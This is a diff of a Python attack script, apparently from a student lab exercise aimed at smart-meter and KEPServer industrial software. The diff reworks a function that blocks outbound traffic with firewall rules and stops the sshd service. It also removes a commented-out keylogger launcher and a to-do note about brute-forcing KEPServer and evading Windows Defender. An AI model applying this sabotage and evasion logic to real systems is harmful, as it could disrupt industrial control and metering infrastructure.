@@ -15,19 +15,6 @@ from time import sleep
 import kepconfig
 import pkgutil
 
-'''
-
-Test disable_COMPort & bruteForceKEP
-
-Test Disable SSH, sshd
-
-SS Reconscript & encryption/decryption contents
-
-Check if Windows Defender will detect our exe
-
-'''
-
-
 copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
 smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
 
@@ -95,17 +82,19 @@ def disable_ssh():
     else:
         print("Outbound Firewall Failed to be Inserted")
 
-    if count == 4:
-        service_name = "sshd"
-        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-        print("Firewall Rules added successfully.\nOk.\n")
+    service_name = "sshd"
+    cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
+    output = cp.stdout.decode('utf-8').strip().split()
+    if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]))
     else:
-        print("Firewall Rules failed to add.\nFail.\n")
+        print("The " + output[1] + " service is " + output[9])
+        count += 1
+
+    if count == 5:
+        print("SSH Disabled successfully.\nOk.\n")
+    else:
+        print("SSH Failed to Disable.\nFail.\n")
         
 #Disable Kepserver Service
 def disable_kepserver():
@@ -404,12 +393,6 @@ def clearEnergyReading():
     except CalledProcessError as e:
         print("Error executing the executable file:", e)
         print("Fail.\n")
-
-# def runKeylogger():
-#     current_directory = getcwd()
-#     executable_path = current_directory + "\\Keylogger.exe"
-#     print("Keylogger running successfully.\nOk.\n")
-#     check_call([executable_path])
 
 def bruteForceKEP():
 
